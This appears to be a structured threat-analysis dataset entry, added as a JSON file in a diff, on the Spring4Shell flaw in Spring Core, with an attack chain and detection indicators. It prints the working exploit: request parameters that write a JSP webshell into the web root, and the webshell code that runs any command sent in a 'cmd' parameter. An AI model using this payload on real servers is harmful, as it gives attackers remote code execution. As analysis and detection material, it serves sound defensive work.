@@ -1,0 +1,101 @@
+{
+  "package_info": {
+    "package_name": "spring-core",
+    "package_manager": "Maven/Gradle",
+    "package_versions": "5.3.0 to 5.3.17, 5.2.0 to 5.2.19, and older versions",
+    "why_malicious": "The affected versions of the Spring Core framework contain a critical vulnerability (CVE-2022-22965, also known as Spring4Shell) that allows attackers to send specially crafted HTTP requests to manipulate internal class loader and pipeline properties. This enables unauthenticated remote code execution (RCE) by allowing attackers to upload and execute arbitrary code, such as webshells, on servers running vulnerable configurations."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (HTTP request processing)",
+        "file_location": "Spring Controller (RequestMapping interface) / HTTP request body",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "web server execution context"
+        ]
+      },
+      "code_snippet": "{\n  \"class.module.classLoader.resources.context.parent.pipeline.first.pattern\": \"%{c2}i if(\\\"j\\\".equals(request.getParameter(\\\"pwd\\\"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter(\\\"cmd\\\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i\",\n  \"class.module.classLoader.resources.context.parent.pipeline.first.suffix\": \".jsp\",\n  \"class.module.classLoader.resources.context.parent.pipeline.first.directory\": \"webapps/ROOT\",\n  \"class.module.classLoader.resources.context.parent.pipeline.first.prefix\": \"tomcatwar\",\n  \"class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat\": \"\"\n}",
+      "code_language": "java (payload delivered via HTTP parameters)",
+      "code_behavior": "At runtime, the code injects a malicious pattern into the Tomcat logging pipeline via specially crafted HTTP parameters, causing the server to write a new .jsp webshell file to the webapps/ROOT directory. The injected pattern enables the execution of arbitrary system commands received via HTTP requests, and the output is returned to the attacker.",
+      "malice_analysis": {
+        "why_suspicious": "The code leverages HTTP parameters to manipulate internal Java class loader and Tomcat pipeline properties, resulting in the creation of a webshell that allows arbitrary command execution. This is highly abnormal and indicative of exploitation.",
+        "violated_expectations": "Normal HTTP requests should not be able to modify server-side class loader or pipeline properties, nor should they result in the creation of new executable files on the server. Application logic should never allow remote users to inject code into server configuration.",
+        "similar_legitimate_use": "Server-side configuration via HTTP parameters may be used in restricted administrative interfaces, but never for arbitrary file creation or code execution, and always with strong authentication and auditing.",
+        "key_indicators": [
+          "Use of class.module.classLoader.* parameters in HTTP requests",
+          "Injection of Java code via HTTP request body to server internals",
+          "Creation of .jsp files in webapps/ROOT directory by the web server process",
+          "Injected pattern enables arbitrary command execution via webshell"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "post-exploitation (HTTP GET to webshell)",
+        "file_location": "webapps/ROOT/tomcatwar.jsp (or similar .jsp webshell)",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "web server execution context"
+        ]
+      },
+      "code_snippet": "if(\"j\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } }",
+      "code_language": "java (JSP webshell)",
+      "code_behavior": "At post-exploitation, when the webshell .jsp file is accessed with the correct password parameter, the code executes arbitrary system commands provided via the 'cmd' parameter and returns the output to the HTTP response.",
+      "malice_analysis": {
+        "why_suspicious": "The code provides a backdoor for remote command execution via HTTP requests, which is a classic webshell behavior. It allows attackers to run arbitrary system commands on the server with minimal authentication.",
+        "violated_expectations": "Legitimate .jsp files should not allow unauthenticated users to execute arbitrary system commands. Web applications should never expose system-level command execution to user input.",
+        "similar_legitimate_use": "Administrative web interfaces may allow limited command execution, but always with strong authentication, authorization, and auditing. Use of a simple password parameter is not sufficient for legitimate use.",
+        "key_indicators": [
+          "Direct use of Runtime.getRuntime().exec() with user-supplied input",
+          "Output of command execution returned in HTTP response",
+          "Presence of a password parameter ('pwd') as a weak authentication mechanism",
+          "JSP file in web-accessible directory containing command execution logic"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker sends a specially crafted HTTP POST request with class.module.classLoader.* parameters to the vulnerable Spring application.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Malicious .jsp webshell is written to the webapps/ROOT directory."
+    },
+    {
+      "step": 2,
+      "action": "Attacker accesses the newly created .jsp webshell (e.g., tomcatwar.jsp) via HTTP GET, providing the correct password and command parameters.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Arbitrary system commands are executed on the server and results are returned to the attacker."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "HTTP requests containing class.module.classLoader.* parameters targeting Spring-based applications",
+      "Creation of new .jsp files in web-accessible directories (e.g., webapps/ROOT) by the web server process",
+      "Webshell-like behavior: .jsp files executing system commands based on HTTP parameters such as 'pwd' and 'cmd'",
+      "Unusual process spawning (e.g., shell, system utilities) from Java/Tomcat processes, especially following suspicious HTTP requests"
+    ],
+    "file_indicators": [
+      "webapps/ROOT/tomcatwar.jsp",
+      "webapps/ROOT/lalalalal.jsp",
+      "webapps/ROOT/crashed_log_.jsp",
+      "webapps/ROOT/ofc.jsp",
+      "*.jsp files created at unusual times or by the web server process"
+    ],
+    "network_indicators": [
+      "HTTP requests to .jsp endpoints with 'pwd' and 'cmd' parameters",
+      "Mass scanning for common .jsp endpoints (e.g., /admin.jsp, /login.jsp, /register.jsp)",
+      "Outbound connections from the server following webshell deployment (potential C2 or exfiltration)"
+    ],
+    "how_to_detect": "Monitor HTTP request bodies for class.module.classLoader.* parameters, especially those attempting to write .jsp files. Watch for the creation of new .jsp files in web-accessible directories, and alert on access to these files with suspicious query parameters (e.g., 'pwd', 'cmd'). Detect unusual process execution (e.g., shell, system utilities) spawned by Java or Tomcat processes. Correlate these events with access logs showing requests to newly created .jsp files. Combine file creation, process execution, and network activity for high-confidence detection."
+  }
+}
